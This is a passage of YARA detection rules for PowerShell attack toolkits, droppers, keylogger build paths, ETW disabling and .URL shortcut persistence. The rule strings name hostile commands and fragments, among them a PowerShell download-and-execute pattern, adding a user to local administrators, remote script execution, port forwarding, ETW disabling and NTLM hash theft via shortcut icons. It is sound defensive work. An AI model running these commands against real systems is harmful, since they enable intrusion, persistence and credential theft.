		$s4 = "Function Import-DllInRemoteProcess" fullword ascii
		$s5 = "FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))" fullword ascii
		$s6 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)" fullword ascii
		$s7 = "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)" fullword ascii
		$s8 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null" fullword ascii
		$s9 = "::FromBase64String('RABvAG4AZQAhAA==')))" ascii
		$s10 = "Write-Verbose \"PowerShell ProcessID: $PID\"" fullword ascii
		$s11 = "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_2 {
	meta:
		description = "Auto-generated rule - from files Inveigh-BruteForce.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "}.NTLMv2_file_queue[0]|Out-File ${" ascii
		$s2 = "}.NTLMv2_file_queue.RemoveRange(0,1)" ascii
		$s3 = "}.NTLMv2_file_queue.Count -gt 0)" ascii
		$s4 = "}.relay_running = $false" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_PowerUp_2 {
	meta:
		description = "Auto-generated rule - from files PowerUp.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
	strings:
		$s1 = "if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::" ascii
		$s2 = "FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {" ascii
		$s3 = "$Null = Invoke-ServiceStart" ascii
		$s4 = "Write-Warning \"[!] Access to service $" ascii
		$s5 = "} = $MyConString.Split(\"=\")[1].Split(\";\")[0]" ascii
		$s6 = "} += \"net localgroup ${" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Persistence_2 {
	meta:
		description = "Auto-generated rule - from files Persistence.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd"
	strings:
		$s1 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
		$s2 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')" ascii
		$s3 = "FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')" ascii
		$s4 = "[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]" ascii
		$s5 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))" ascii
		$s6 = "[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]" fullword ascii
		$s7 = "FromBase64String('TQBlAHQAaABvAGQA')" ascii
		$s8 = "FromBase64String('VAByAGkAZwBnAGUAcgA=')" ascii
		$s9 = "[Runtime.InteropServices.CallingConvention]::Winapi," fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Inveigh_BruteForce_3 {
	meta:
		description = "Auto-generated rule - from files Inveigh-BruteForce.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash3 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "::FromBase64String('TgBUAEwATQA=')" ascii
		$s2 = "::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))" ascii
		$s3 = "::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))" ascii
		$s4 = "::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))" ascii
		$s5 = "[Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`" fullword ascii
		$s6 = "KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA" ascii
		$s7 = "}.bruteforce_running)" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-27
   Identifier: PowerShell Empire Eval
   2 of 8 rules
*/

/* Rule Set ----------------------------------------------------------------- */

rule PowerShell_Emp_Eval_Jul17_A1 {
   meta:
      description = "Detects suspicious sample with PowerShell content "
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "PowerShell Empire Eval"
      date = "2017-07-27"
      hash1 = "4d10e80c7c80ef040efc680424a429558c7d76a965685bbc295908cb71137eba"
   strings:
      $s1 = "powershell" wide
      $s2 = "pshcmd" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and all of them )
}

rule PowerShell_Emp_Eval_Jul17_A2 {
   meta:
      description = "Detects suspicious sample with PowerShell content "
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "PowerShell Empire Eval"
      date = "2017-07-27"
      hash1 = "e14c139159c23fdc18969afe57ec062e4d3c28dd42a20bed8ddde37ab4351a51"
   strings:
      $x1 = "\\support\\Release\\ab.pdb" ascii
      $s2 = "powershell.exe" ascii fullword
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Ping_Command_in_EXE {
   meta:
      description = "Detects an suspicious ping command execution in an executable"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-11-03"
      score = 60
   strings:
      $x1 = "cmd /c ping 127.0.0.1 -n " ascii
   condition:
      uint16(0) == 0x5a4d and all of them
}

rule GoogleBot_UserAgent {
   meta:
      description = "Detects the GoogleBot UserAgent String in an Executable"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-27"
      score = 65
   strings:
      $x1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii

      $fp1 = "McAfee, Inc." wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and $x1 and not 1 of ($fp*) )
}

rule Gen_Net_LocalGroup_Administrators_Add_Command {
   meta:
      description = "Detects an executable that contains a command to add a user account to the local administrators group"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-07-08"
   strings:
      $x1 = /net localgroup administrators [a-zA-Z0-9]{1,16} \/add/ nocase ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them )
}

rule Suspicious_Script_Running_from_HTTP {
   meta:
      description = "Detects a suspicious "
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100"
      score = 50
      date = "2017-08-20"
   strings:
      $s1 = "cmd /C script:http://" ascii nocase
      $s2 = "cmd /C script:https://" ascii nocase
      $s3 = "cmd.exe /C script:http://" ascii nocase
      $s4 = "cmd.exe /C script:https://" ascii nocase
   condition:
      1 of them
}

rule ReconCommands_in_File {
   meta:
      description = "Detects various recon commands in a single file"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/haroonmeer/status/939099379834658817"
      date = "2017-12-11"
      score = 40
      type = "file"
   strings:
      $ = "tasklist"
      $ = "net time"
      $ = "systeminfo"
      $ = "whoami"
      $ = "nbtstat"
      $ = "net start"
      $ = "qprocess"
      $ = "nslookup"
   condition:
      filesize < 5KB and 4 of them
}

rule VBS_dropper_script_Dec17_1 {
   meta:
      description = "Detects a supicious VBS script that drops an executable"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-01-01"
      score = 80
   strings:
      $s1 = "TVpTAQEAAAAEAA" // 14 samples in goodware archive
      $s2 = "TVoAAAAAAAAAAA" // 26 samples in goodware archive
      $s3 = "TVqAAAEAAAAEAB" // 75 samples in goodware archive
      $s4 = "TVpQAAIAAAAEAA" // 168 samples in goodware archive
      $s5 = "TVqQAAMAAAAEAA" // 28,529 samples in goodware archive

      $a1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
   condition:
      filesize < 600KB and $a1 and 1 of ($s*)
}

rule SUSP_PDB_Strings_Keylogger_Backdoor {
   meta:
      description = "Detects PDB strings used in backdoors or keyloggers"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-03-23"
      score = 65
   strings:
      $ = "\\Release\\PrivilegeEscalation"
      $ = "\\Release\\KeyLogger"
      $ = "\\Debug\\PrivilegeEscalation"
      $ = "\\Debug\\KeyLogger"
      $ = "Backdoor\\KeyLogger_"
      $ = "\\ShellCode\\Debug\\"
      $ = "\\ShellCode\\Release\\"
      $ = "\\New Backdoor"
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB
      and 1 of them
}

rule SUSP_Microsoft_Copyright_String_Anomaly_2 {
   meta:
      description = "Detects Floxif Malware"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-11"
      score = 60
      hash1 = "de055a89de246e629a8694bde18af2b1605e4b9b493c7e4aef669dd67acf5085"
   strings:
      $s1 = "Microsoft(C) Windows(C) Operating System" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and 1 of them
}

rule SUSP_LNK_File_AppData_Roaming {
   meta:
      description = "Detects a suspicious link file that references to AppData Roaming"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html"
      date = "2018-05-16"
      score = 50
   strings:
      $s2 = "AppData" fullword wide
      $s3 = "Roaming" fullword wide
      /* .exe\x00C:\Users\ */
      $s4 = { 00 2E 00 65 00 78 00 65 00 2E 00 43 00 3A 00 5C
              00 55 00 73 00 65 00 72 00 73 00 5C }
   condition:
      uint16(0) == 0x004c and uint32(4) == 0x00021401 and (
         filesize < 1KB and
         all of them
      )
}

rule SUSP_LNK_File_PathTraversal {
   meta:
      description = "Detects a suspicious link file that references a file multiple folders lower than the link itself"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/05/deep-dive-into-rig-exploit-kit-delivering-grobios-trojan.html"
      date = "2018-05-16"
      score = 40
   strings:
      $s1 = "..\\..\\..\\..\\..\\"
   condition:
      uint16(0) == 0x004c and uint32(4) == 0x00021401 and (
         filesize < 1KB and
         all of them
      )
}

rule SUSP_Script_Obfuscation_Char_Concat {
   meta:
      description = "Detects strings found in sample from CN group repo leak in October 2018"
      author = "Florian Roth"
      reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
      date = "2018-10-04"
      hash1 = "b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b"
   strings:
      $s1 = "\"c\" & \"r\" & \"i\" & \"p\" & \"t\"" ascii
   condition:
      1 of them
}

rule SUSP_PowerShell_IEX_Download_Combo {
   meta:
      description = "Detects strings found in sample from CN group repo leak in October 2018"
      author = "Florian Roth"
      reference = "https://twitter.com/JaromirHorejsi/status/1047084277920411648"
      date = "2018-10-04"
      hash1 = "13297f64a5f4dd9b08922c18ab100d3a3e6fdeab82f60a4653ab975b8ce393d5"
   strings:
      $x1 = "IEX ((new-object net.webclient).download" ascii nocase

      $fp = "Remote Desktop in the Appveyor" ascii
   condition:
      $x1 and not 1 of ($fp*)
}

rule SUSP_Win32dll_String {
   meta:
      description = "Detects suspicious string in executables"
      author = "Florian Roth"
      reference = "https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739"
      date = "2018-10-24"
      hash1 = "7bd7cec82ee98feed5872325c2f8fd9f0ea3a2f6cd0cd32bcbe27dbbfd0d7da1"
   strings:
      $s1 = "win32dll.dll" fullword ascii
   condition:
      filesize < 60KB and all of them
}

rule SUSP_Modified_SystemExeFileName_in_File {
   meta:
      description = "Detecst a variant of a system file name often used by attackers to cloak their activity"
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11"
      score = 65
      hash1 = "5723f425e0c55c22c6b8bb74afb6b506943012c33b9ec1c928a71307a8c5889a"
      hash2 = "f1f11830b60e6530b680291509ddd9b5a1e5f425550444ec964a08f5f0c1a44e"
   strings:
      $s1 = "svchosts.exe" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and 1 of them
}

rule SUSP_JAVA_Class_with_VBS_Content {
   meta:
      description = "Detects a JAVA class file with strings known from VBS files"
      author = "Florian Roth"
      reference = "https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies"
      date = "2019-01-03"
      score = 60
      hash1 = "e0112efb63f2b2ac3706109a233963c19750b4df0058cc5b9d3fa1f1280071eb"
   strings:
      $a1 = "java/lang/String" ascii

      $s1 = ".vbs" ascii
      $s2 = "createNewFile" fullword ascii
      $s3 = "wscript" fullword ascii nocase
   condition:
      uint16(0) == 0xfeca and filesize < 100KB and $a1 and 3 of ($s*)
}

rule SUSP_RAR_with_PDF_Script_Obfuscation {
   meta:
      description = "Detects RAR file with suspicious .pdf extension prefix to trick users"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-04-06"
      hash1 = "b629b46b009a1c2306178e289ad0a3d9689d4b45c3d16804599f23c90c6bca5b"
   strings:
      $s1 = ".pdf.vbe" ascii
      $s2 = ".pdf.vbs" ascii
      $s3 = ".pdf.ps1" ascii
      $s4 = ".pdf.bat" ascii
      $s5 = ".pdf.exe" ascii
   condition:
      uint32(0) == 0x21726152 and 1 of them
}

rule SUSP_Netsh_PortProxy_Command {
   meta:
      description = "Detects a suspicious command line with netsh and the portproxy command"
      author = "Florian Roth"
      reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
      date = "2019-04-20"
      score = 65
      hash1 = "9b33a03e336d0d02750a75efa1b9b6b2ab78b00174582a9b2cb09cd828baea09"
   strings:
      $x1 = "netsh interface portproxy add v4tov4 listenport=" ascii
   condition:
      1 of them
}

rule SUSP_DropperBackdoor_Keywords {
   meta:
      description = "Detects suspicious keywords that indicate a backdoor"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html"
      date = "2019-04-24"
      hash1 = "cd4b9d0f2d1c0468750855f0ed352c1ed6d4f512d66e0e44ce308688235295b5"
   strings:
      $x4 = "DropperBackdoor" fullword wide ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them
}

rule SUSP_SFX_cmd {
   meta:
      description = "Detects suspicious SFX as used by Gamaredon group"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-09-27"
      hash1 = "965129e5d0c439df97624347534bc24168935e7a71b9ff950c86faae3baec403"
   strings:
      $s1 = /RunProgram=\"hidcon:[a-zA-Z0-9]{1,16}.cmd/ fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
}

rule SUSP_XMRIG_Reference {
   meta:
      description = "Detects an executable with a suspicious XMRIG crypto miner reference"
      author = "Florian Roth"
      reference = "https://twitter.com/itaitevet/status/1141677424045953024"
      date = "2019-06-20"
      score = 70
   strings:
      $x1 = "\\xmrig\\" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
}

rule SUSP_Just_EICAR {
   meta:
      description = "Just an EICAR test file - this is boring but users asked for it"
      author = "Florian Roth"
      reference = "http://2016.eicar.org/85-0-Download.html"
      date = "2019-03-24"
      score = 40
      hash1 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
   strings:
      $s1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" fullword ascii
   condition:
      uint16(0) == 0x3558 and filesize < 70 and $s1 at 0
}

rule SUSP_PDB_Path_Keywords {
   meta:
      description = "Detects suspicious PDB paths"
      author = "Florian Roth"
      reference = "https://twitter.com/stvemillertime/status/1179832666285326337?s=20"
      date = "2019-10-04"
   strings:
      $ = "Debug\\Shellcode" ascii
      $ = "Release\\Shellcode" ascii
      $ = "Debug\\ShellCode" ascii
      $ = "Release\\ShellCode" ascii
      $ = "Debug\\shellcode" ascii
      $ = "Release\\shellcode" ascii
      $ = "shellcode.pdb" nocase ascii
      $ = "\\ShellcodeLauncher" ascii
      $ = "\\ShellCodeLauncher" ascii
      $ = "Fucker.pdb" ascii
      $ = "\\AVFucker\\" ascii
      $ = "ratTest.pdb" ascii
      $ = "Debug\\CVE_" ascii
      $ = "Release\\CVE_" ascii
      $ = "Debug\\cve_" ascii
      $ = "Release\\cve_" ascii
   condition:
      uint16(0) == 0x5a4d and 1 of them
}

rule SUSP_Disable_ETW_Jun20_1 {
   meta:
      description = "Detects method to disable ETW in ENV vars before exeucting a program"
      author = "Florian Roth"
      reference = "https://gist.github.com/Cyb3rWard0g/a4a115fd3ab518a0e593525a379adee3"
      date = "2020-06-06"
   strings:
      $x1 = "set COMPlus_ETWEnabled=0" ascii wide fullword
      $x2 = "$env:COMPlus_ETWEnabled=0" ascii wide fullword

      $s1 = "Software\\Microsoft.NETFramework" ascii wide
      $sa1 = "/v ETWEnabled" ascii wide fullword 
      $sa2 = " /d 0" ascii wide
      $sb4 = "-Name ETWEnabled"
      $sb5 = " -Value 0 "
   condition:
      1 of ($x*) or 3 of them 
}
rule gen_unicorn_obfuscated_powershell {
    meta:
        description = "PowerShell payload obfuscated by Unicorn toolkit"
        author = "John Lambert @JohnLaTwC"
        date = "2018-04-03"
        hash = "b93d2fe6a671a6a967f31d5b3a0a16d4f93abcaf25188a2bbdc0894087adb10d"
        hash2 = "1afb9795cb489abce39f685a420147a2875303a07c32bf7eec398125300a460b"
        reference = "https://github.com/trustedsec/unicorn/"
    strings:
        $h1 = "powershell"
        $sa1 = ".value.toString() 'JAB"
        $sa2 = ".value.toString() ('JAB"
        $sb1 = "-w 1 -C \"s"
        $sb2 = "/w 1 /C \"s"        
    condition:
        filesize < 20KB
        and uint32be(0) == 0x706f7765
        and $h1 at 0
        and (
           uint16be(filesize-2) == 0x2722 or  /* Footer 1 */
           ( uint16be(filesize-2) == 0x220a and uint8(filesize-3) == 0x27 )  or /* Footer 2 */
           ( uint16be(filesize-2) == 0x2922 and uint8(filesize-3) == 0x27 )  /* Footer 3 */
        )
        and ( 1 of ($sa*) and 1 of ($sb*) )
}

rule Methodology_Suspicious_Shortcut_Local_URL
{
  meta:
    author = "@itsreallynick (Nick Carr), @QW5kcmV3 (Andrew Thompson)"
    description = "Detects local script usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $file = "URL=file:///" nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $file and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_SMB_URL
{
  meta:
    author = "@itsreallynick (Nick Carr), @QW5kcmV3 (Andrew Thompson)"
    description = "Detects remote SMB path for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    sample = "e0bef7497fcb284edb0c65b59d511830"
    score = 50
    date = "27.09.2019"
  strings:
    $file = /URL=file:\/\/[a-z0-9]/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $file and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_IconRemote_HTTP
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = /IconFile\s*=\s*http/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $icon and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_IconRemote_SMBorLocal
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "This is the syntax used for NTLM hash stealing via Responder - https://www.securify.nl/nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html"
    reference = "https://twitter.com/ItsReallyNick/status/1176241449148588032"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = "IconFile=file://" nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $icon and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Shortcut_HotKey
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $hotkey = /[\x0a\x0d]HotKey=[1-9]/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $hotkey and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_BaseURLSyntax
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $baseurl1 = "BASEURL=file://" nocase
    $baseurl2 = "[DEFAULT]" nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    all of ($baseurl*) and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Contains_Shortcut_OtherURIhandlers
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Noisy rule for .URL shortcuts containing unique URI handlers"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 35
    date = "27.09.2019"
  strings:
    $file = "URL="
    $filenegate = /[\x0a\x0d](Base|)URL\s*=\s*(https?|file):\/\// nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $file and any of ($url*) and not $filenegate
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_IconShenanigans_dotDL
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    reference = "https://twitter.com/ItsReallyNick/status/1176229087196696577"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = /[\x0a\x0d]IconFile=[^\x0d]*\.dl\x0d/ nocase ascii wide
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($url*) and $icon
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_IconNotFromExeOrDLLOrICO
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    reference = "https://twitter.com/ItsReallyNick/status/1176229087196696577"
    description = "Detects possible shortcut usage for .URL persistence"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = "IconFile="
    $icon_negate = /[\x0a\x0d]IconFile=[^\x0d]*\.(dll|exe|ico)\x0d/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($url*) and $icon and not $icon_negate
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_Evasion
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Non-standard .URLs and evasion"
    reference = "https://twitter.com/DissectMalware/status/1176736510856634368"
    score = 50
    date = "27.09.2019"
  strings:
    $URI = /[\x0a\x0d](IconFile|(Base|)URL)[^\x0d=]+/ nocase
    $filetype_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $filetype_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($filetype*) and $URI //and $URInegate
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

// the below rule hasn't been seen, but I still want to explore whether this format can be abused to launch commands in unstructured .URL space
rule Methodology_Suspicious_Shortcut_LOLcommand
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    reference = "https://twitter.com/ItsReallyNick/status/1176601500069576704"
    description = "Detects possible shortcut usage for .URL persistence"
    score = 50
    date = "27.09.2019"
  strings:
    $file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=[^\x0d]*(powershell|cmd|certutil|mshta|wscript|cscript|rundll32|wmic|regsvr32|msbuild)(\.exe|)[^\x0d]{2,}\x0d/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($url*) and any of ($file*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

// NONE of the following rules have been seen itw, but they are searching for unique (possible?) .URL syntax - leaving here for transparency
rule Methodology_Suspicious_Shortcut_WebDAV
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    reference = "https://twitter.com/cglyer/status/1176243536754282497"
    description = "Detects possible shortcut usage for .URL persistence"
    score = 50
    date = "27.09.2019"
  strings:
    $file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=\s*\/\/[A-Za-z0-9]/
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($url*) and any of ($file*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_ScriptURL
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $file1 = /[\x0a\x0d](IconFile|(Base|)URL)\s*=[^\x0d]*script:/ nocase
